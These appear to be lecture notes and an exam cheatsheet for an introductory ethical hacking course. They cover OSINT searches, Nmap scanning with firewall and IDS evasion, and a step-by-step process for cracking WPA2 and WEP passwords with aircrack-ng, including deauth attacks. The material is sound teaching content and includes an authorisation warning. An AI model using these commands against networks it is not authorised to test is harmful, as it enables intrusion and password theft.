LECTURE 01 Introduction to Hacking Lab · Kali Linux Basics
🎯 Key Terms
  • Hacker — explores, analyzes, and manipulates systems
  • White Hat — ethical hacker who secures systems
  • Black Hat — malicious hacker with harmful intent
  • Gray Hat — acts without permission but not with bad intent
  • Vulnerability — a weakness in a system
  • Exploit — a method to take advantage of a vulnerability
⚔️ Offensive Security
  • Penetration Testing — testing a system by attempting to breach it
  • Red Teaming — long-term attacks simulating real-world threats
  • Ethical Hacking — using hacking techniques for security purposes
🛡️ Defensive Security
  • Blue Teaming — infrastructure protection and threat monitoring
  • Incident Response — analyzing and mitigating attack consequences
  • Threat Hunting — actively searching for hackers inside a network
  • IDS — Intrusion Detection System
Offensive vs Defensive: Offensive = proactive vulnerability discovery (attacking). Defensive = protection, monitoring, incident response. Both approaches are essential for comprehensive security.

OSINT Tools
🔭 Shodan

A search engine for internet-connected devices and services (servers, IoT, SCADA, cameras) — not websites.

  • webcamXP — find exposed cameras
  • port:22 country:KZ — SSH in Kazakhstan
  • org:"Jusan Mobile" — by organization
  • port:3389 — exposed RDP services
  • apache country:KZ port:80
🕸️ Maltego

Visualizes relationships between people, domains, and IPs using Transforms — automated data source queries.

  • Graph: entities (nodes) + relationships (edges)
  • Pivot: one data point expands into a full network
  • Sources: DNS, WHOIS, social media, data leaks
  • Used for cyber investigations and OSINT analysis
📡 theHarvester

Collects emails, subdomains, IPs, and employee names from Google, Bing, and DNS.

theHarvester -d example.com -b google
🌐 WHOIS

Public database for looking up domain and IP ownership details.

  • Domain owner: name, email, company
  • Registration and expiration dates
  • Hosting providers and IP addresses
  • Tool: who.is
🔎 Google Dorking

Advanced Google search operators to find hidden data, exposed files, and vulnerabilities.

  • filetype:pdf — search for PDF files
  • inurl:login — find login pages
  • intext:"password" — word in page body
  • intitle:"index of" — open directory listings
  • site:example.com — search within a domain
  • link:example.com — pages linking to a domain
🤖 SpiderFoot

Automated OSINT tool that collects and correlates data from many public sources.

  • Launch: python3 sf.py -l 127.0.0.1:5001
  • Web-based interface for visualization
  • Automated recon from a single domain or IP

site:example.com inurl:admin — admin login panels

How TCP SYN Scan (-sS) works:
Nmap sends a SYN packet and checks the response:
• SYN-ACK received → port is OPEN
• RST received → port is CLOSED
• No reply → port is FILTERED (firewall is blocking)
Bypassing Firewalls and IDS
1. Decoy Scanning (-D)

Makes it appear that multiple hosts are scanning the target, making it hard to identify the real attacker.

nmap -sS -D RND:10 192.168.1.1 nmap -sS -D 192.168.1.100,ME 192.168.1.1
2. Packet Fragmentation (-f)

Splits packets into tiny fragments — IDS/IPS may miss fragmented traffic that it would block in full form.

nmap -sS -f 192.168.1.1
3. Source IP Spoofing (-S)

Tricks the target into thinking the scan originates from a different IP address.

nmap -S 192.168.1.100 -e eth0 192.168.1.1
4. Source Port Spoofing

Mimics DNS (53) or HTTPS (443) traffic to pass through firewalls that allow those service ports.

nmap -sS -p 80 --source-port 53 192.168.1.1
5. Idle / Zombie Scan (-sI)

Uses a zombie host as a relay — the target sees the zombie's IP instead of the real attacker's.

nmap -sI 192.168.1.100 192.168.1.1
6. IPv6 Scanning

Many firewalls focus on IPv4 filtering but may completely ignore IPv6 traffic.

nmap -6 -sS fe80::1

TCP vs UDP:
TCP — reliable, confirms delivery, slower. Three-way handshake: SYN → SYN-ACK → ACK. Like tracked parcel delivery.
UDP — fast, no confirmation, packets can be lost. Used for DNS (port 53) and SNMP (port 161). Like shouting — no guarantee it's heard.
LECTURE 04 Network Hacking · WPA/WPA2 Cracking · WiFi
Requirements for WiFi hacking: 1) Your own wireless access point (never attack someone else's — it is illegal and unethical). 2) A wireless adapter that supports packet injection and monitor mode.
WiFi Encryption Types
🔓 OPN (Open Network)
  • NO encryption whatsoever
  • All data transmitted in plaintext
  • All traffic can be intercepted and read
  • Common in cafes, airports, hotels
  • HTTP POST credentials, cookies — all visible
⚠️ WEP (Wired Equivalent Privacy)
  • Outdated standard — CRITICALLY INSECURE
  • Uses RC4 algorithm with small key sizes
  • Reuses Initialization Vectors (IVs) — fatal flaw
  • Crackable in minutes with aircrack-ng
  • Needs ~20,000–60,000 IVs to crack
🔒 WPA2 (Wi-Fi Protected Access 2)
  • AES-CCMP protocol — strong encryption
  • PSK (pre-shared key) or Enterprise (MGT)
  • Cannot be cracked directly
  • Requires a captured handshake + dictionary attack
  • Security depends entirely on password strength
🛡️ WPA3 (Latest Standard)
  • SAE — Simultaneous Authentication of Equals
  • "Dragonfly handshake" — prevents offline attacks
  • Forward secrecy — past captured traffic stays safe
  • Enforces protected management frames
  • Not fully immune — misconfiguration still a risk
Aircrack-ng Suite Tools
airmon-ng

Switches the wireless adapter into Monitor Mode, allowing it to capture all wireless traffic in range.

airmon-ng start wlan0 # Creates interface wlan0mon airmon-ng check kill # Stop processes that interfere
airodump-ng

Scans and captures WiFi traffic. Shows nearby networks, connected clients, and captured handshakes.

airodump-ng wlan0mon # Scan all nearby networks airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
aireplay-ng

Sends deauth packets to forcibly disconnect clients from an AP, causing them to reconnect and generating a handshake.

aireplay-ng -0 20 -a AA:BB:CC:DD:EE:FF wlan0mon # -0 = deauth mode, 20 = packet count
aircrack-ng

Performs a dictionary attack on a captured WPA/WPA2 handshake, or statistically cracks WEP from collected IVs.

# WPA2 dictionary attack aircrack-ng -w /root/rockyou-top100000.txt -b AA:BB:CC capture.cap # WEP statistical crack aircrack-ng wpa_capture-04.cap
Step-by-Step Attack Processes
⚠️ WPA2 Cracking — Full Process
1
Enable Monitor Mode
airmon-ng start wlan0 → creates wlan0mon interface
2
Scan for Networks
airodump-ng wlan0mon → note BSSID, Channel, ESSID of target
3
Capture Target Traffic
airodump-ng -c 6 --bssid [BSSID] -w capture wlan0mon
4
Deauth Attack (separate terminal)
aireplay-ng -0 20 -a [BSSID] wlan0mon → wait for STATION and WPA handshake (EAPOL)
5
Dictionary Attack on Handshake
aircrack-ng -w /root/rockyou-top100000.txt -b [BSSID] capture.cap → KEY FOUND!
⚠️ WEP Cracking — Process
1
Monitor Mode + Scan
Find a WEP network — look for ENC column showing "WEP WEP"
2
Capture Packets
airodump-ng -c 3 --bssid [BSSID] -w capture wlan0mon
3
Collect IVs (20,000–60,000+)
Run airodump + aireplay simultaneously. More IVs = higher probability of cracking.
4
Crack the Key
aircrack-ng capture.cap → KEY FOUND! [11:BB:33:CD:55] (hex format)

EXAM PREP Key Facts · Exam Cheatsheet
📌 Must-Know Facts
  • WEP is cracked via IVs — need 20k–60k+ to succeed
  • WPA2 is cracked via handshake + wordlist dictionary
  • OPN = no encryption, entire traffic is visible
  • Monitor mode: wlan0 → wlan0mon
  • Deauth flag = -0  |  Dictionary flag = -w in aircrack
  • EAPOL in airodump Notes = handshake captured
  • WPA3 uses SAE (the Dragonfly handshake)
  • Passive recon is harder to detect than active
  • OSINT = gathering only publicly available data
  • Shodan indexes devices, not websites
🌐 Ports to Know
  • 22 — SSH
  • 23 — Telnet
  • 25 — SMTP (email)
  • 53 — DNS (UDP)
  • 80 — HTTP
  • 161 — SNMP (UDP)
  • 443 — HTTPS
  • 3389 — RDP (Remote Desktop)
